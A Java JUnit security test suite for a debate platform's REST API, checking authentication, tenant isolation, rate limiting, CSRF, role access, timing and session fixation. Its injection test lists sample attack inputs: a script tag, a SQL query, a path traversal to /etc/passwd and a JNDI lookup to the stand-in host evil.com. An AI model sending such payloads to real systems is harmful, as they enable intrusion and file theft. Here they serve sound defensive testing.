package com.zamaz.mcp.testing.security;

import io.restassured.response.Response;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.CsvSource;
import org.junit.jupiter.params.provider.ValueSource;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.test.context.ActiveProfiles;

import java.util.Map;
import java.util.UUID;

import static io.restassured.RestAssured.given;
import static org.hamcrest.Matchers.*;

/**
 * Automated security testing suite
 */
@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
@ActiveProfiles("security-test")
public class SecurityTestSuite extends BaseSecurityTest {
    
    @Test
    @DisplayName("Should reject requests without authentication")
    void testUnauthenticatedAccess() {
        given()
            .spec(requestSpec)
            .when()
            .get("/api/v1/debates")
            .then()
            .statusCode(401)
            .body("error", equalTo("Unauthorized"));
    }
    
    @Test
    @DisplayName("Should reject requests with invalid token")
    void testInvalidToken() {
        given()
            .spec(requestSpec)
            .header("Authorization", "Bearer invalid-token")
            .when()
            .get("/api/v1/debates")
            .then()
            .statusCode(401)
            .body("error", equalTo("Invalid token"));
    }
    
    @Test
    @DisplayName("Should reject requests with expired token")
    void testExpiredToken() {
        String expiredToken = generateExpiredToken();
        
        given()
            .spec(requestSpec)
            .header("Authorization", "Bearer " + expiredToken)
            .when()
            .get("/api/v1/debates")
            .then()
            .statusCode(401)
            .body("error", equalTo("Token expired"));
    }
    
    @Test
    @DisplayName("Should enforce organization isolation")
    void testOrganizationIsolation() {
        String org1Token = authenticate("user1", "password", "org-1");
        String org2Token = authenticate("user2", "password", "org-2");
        
        // Create debate in org-1
        Response createResponse = given()
            .spec(authenticatedRequest(org1Token, "org-1"))
            .body(createTestDebate())
            .when()
            .post("/api/v1/debates")
            .then()
            .statusCode(201)
            .extract()
            .response();
        
        String debateId = createResponse.path("id");
        
        // Try to access org-1 debate with org-2 token
        given()
            .spec(authenticatedRequest(org2Token, "org-2"))
            .when()
            .get("/api/v1/debates/{id}", debateId)
            .then()
            .statusCode(403)
            .body("error", equalTo("Access denied"));
    }
    
    @ParameterizedTest
    @DisplayName("Should validate input against injection attacks")
    @CsvSource({
        "'<script>alert(1)</script>', XSS_DETECTED",
        "'SELECT * FROM users', SQL_INJECTION_DETECTED",
        "'../../../etc/passwd', PATH_TRAVERSAL_DETECTED",
        "'${jndi:ldap://evil.com/a}', JNDI_INJECTION_DETECTED"
    })
    void testInjectionPrevention(String maliciousInput, String expectedError) {
        Map<String, Object> debate = Map.of(
            "title", maliciousInput,
            "topic", "Test Topic",
            "description", "Test Description"
        );
        
        given()
            .spec(authenticatedRequest(validToken, "test-org"))
            .body(debate)
            .when()
            .post("/api/v1/debates")
            .then()
            .statusCode(400)
            .body("error", containsString(expectedError));
    }
    
    @Test
    @DisplayName("Should enforce rate limiting")
    void testRateLimiting() {
        // Make requests up to the limit
        for (int i = 0; i < 100; i++) {
            given()
                .spec(authenticatedRequest(validToken, "test-org"))
                .when()
                .get("/api/v1/debates")
                .then()
                .statusCode(200);
        }
        
        // Next request should be rate limited
        given()
            .spec(authenticatedRequest(validToken, "test-org"))
            .when()
            .get("/api/v1/debates")
            .then()
            .statusCode(429)
            .body("error", equalTo("Rate limit exceeded"))
            .header("X-RateLimit-Remaining", equalTo("0"));
    }
    
    @Test
    @DisplayName("Should prevent CSRF attacks")
    void testCsrfProtection() {
        // Attempt request without CSRF token
        given()
            .spec(requestSpec)
            .header("Authorization", "Bearer " + validToken)
            .header("Origin", "http://evil.com")
            .body(createTestDebate())
            .when()
            .post("/api/v1/debates")
            .then()
            .statusCode(403)
            .body("error", equalTo("CSRF token missing or invalid"));
    }
    
    @ParameterizedTest
    @DisplayName("Should validate authorization for different roles")
    @CsvSource({
        "VIEWER, GET, /api/v1/debates, 200",
        "VIEWER, POST, /api/v1/debates, 403",
        "USER, GET, /api/v1/debates, 200",
        "USER, POST, /api/v1/debates, 201",
        "ADMIN, DELETE, /api/v1/debates/123, 200"
    })
    void testRoleBasedAccess(String role, String method, String path, int expectedStatus) {
        String token = authenticateWithRole("user", "password", "test-org", role);
        
        var request = given()
            .spec(authenticatedRequest(token, "test-org"));
        
        Response response;
        switch (method) {
            case "GET":
                response = request.when().get(path);
                break;
            case "POST":
                response = request.body(createTestDebate()).when().post(path);
                break;
            case "DELETE":
                response = request.when().delete(path);
                break;
            default:
                throw new IllegalArgumentException("Unsupported method: " + method);
        }
        
        response.then().statusCode(expectedStatus);
    }
    
    @Test
    @DisplayName("Should protect against timing attacks")
    void testTimingAttackProtection() {
        String validUser = "existing-user";
        String invalidUser = UUID.randomUUID().toString();
        
        // Measure response time for valid user with wrong password
        long validUserTime = measureAuthTime(validUser, "wrong-password");
        
        // Measure response time for non-existent user
        long invalidUserTime = measureAuthTime(invalidUser, "wrong-password");
        
        // Response times should be similar (within 100ms)
        long timeDifference = Math.abs(validUserTime - invalidUserTime);
        assertTrue(timeDifference < 100, 
            "Timing difference too large: " + timeDifference + "ms");
    }
    
    @ParameterizedTest
    @DisplayName("Should enforce secure headers")
    @ValueSource(strings = {
        "X-Content-Type-Options",
        "X-Frame-Options",
        "X-XSS-Protection",
        "Strict-Transport-Security",
        "Content-Security-Policy"
    })
    void testSecurityHeaders(String headerName) {
        given()
            .spec(authenticatedRequest(validToken, "test-org"))
            .when()
            .get("/api/v1/debates")
            .then()
            .statusCode(200)
            .header(headerName, notNullValue());
    }
    
    @Test
    @DisplayName("Should handle session fixation")
    void testSessionFixation() {
        // Get initial session
        Response loginResponse = given()
            .spec(requestSpec)
            .body(Map.of("username", "user", "password", "password"))
            .when()
            .post("/api/v1/auth/login")
            .then()
            .statusCode(200)
            .extract()
            .response();
        
        String sessionId = loginResponse.cookie("JSESSIONID");
        String token = loginResponse.path("token");
        
        // Login again with same credentials
        Response secondLogin = given()
            .spec(requestSpec)
            .cookie("JSESSIONID", sessionId)
            .body(Map.of("username", "user", "password", "password"))
            .when()
            .post("/api/v1/auth/login")
            .then()
            .statusCode(200)
            .extract()
            .response();
        
        String newSessionId = secondLogin.cookie("JSESSIONID");
        
        // Session ID should change after login
        assertNotEquals(sessionId, newSessionId);
    }
    
    private long measureAuthTime(String username, String password) {
        long startTime = System.currentTimeMillis();
        
        given()
            .spec(requestSpec)
            .body(Map.of("username", username, "password", password))
            .when()
            .post("/api/v1/auth/login")
            .then()
            .statusCode(401);
        
        return System.currentTimeMillis() - startTime;
    }
}